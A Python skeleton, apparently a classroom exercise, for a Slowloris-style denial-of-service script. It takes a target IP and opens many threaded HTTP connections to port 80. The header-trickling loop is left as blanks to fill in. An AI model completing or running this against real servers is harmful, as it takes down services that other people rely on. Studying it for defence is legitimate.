import random
import socket
import string
import sys
import threading
import time


thread_num = 0
thread_num_mutex = threading.Lock()

stop = False


def print_status():
    global thread_num
    thread_num_mutex.acquire(True)
    thread_num += 1
    sys.stdout.write(f"\r {time.ctime().split( )[3]} [{str(thread_num)}] Slow and steady might not win the race, but can tie up the track")
    sys.stdout.flush()
    thread_num_mutex.release()


def attack(ip, port):
    print_status()
    global stop
    while not stop:
    	
    	# create socket
        http_conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
        
        	# open connection
            http_conn.connect((ip, port))
            
            # forge http header
            data = (f"GET HTTP/1.1\nHost: {str(ip)}\r\n").encode()
            
            # send http header
            http_conn.send(data)
            
            for i in range(100000):
                if stop:
                    break
                    
                # forge and send a custom header
                # insert your code here
                
                
                
                # wait some time to send the next custom header
                # (hint: use sleep())
                # insert your code here 
                
                
            http_conn.close()
        except KeyboardInterrupt:
                stop = True
                print("\nExiting...")
                break
        except Exception as e:
            continue


def main():
    ip = input("Enter target IP: ")
    num_requests = input("Enter threads (you can leave this blank): ")
    try:
        ip = socket.gethostbyname(ip)
        num_requests = 200 if num_requests == '' else int(num_requests)
    except:
        sys.exit(1)
    all_threads = []
    for i in range(num_requests):
        t = threading.Thread(target=attack, args=(ip, 80))
        t.start()
        t.deamon = True
        all_threads.append(t)
        time.sleep(0.01)
    for t in all_threads:
        t.join()


if __name__ == "__main__":
    main()
